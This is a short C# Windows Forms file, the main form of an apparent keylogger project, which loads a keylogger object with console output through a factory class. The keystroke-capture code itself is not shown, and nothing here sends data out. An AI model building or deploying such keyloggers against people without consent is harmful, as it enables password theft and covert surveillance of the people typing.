using System;
using System.Windows.Forms;
using Logger.Core;

namespace Logger
{
    public partial class frmMain : Form
    {
        internal Keylogger Logger { get; private set; }

        public frmMain()
        {
            InitializeComponent();
        }

        private void frmMain_Load(object sender, EventArgs e)
        {
            try
            {
                Logger = KeyloggerFactory.GetKeylogger(OutputType.Console);
            }
            catch
            {
                Close();
            }
        }
    }
}
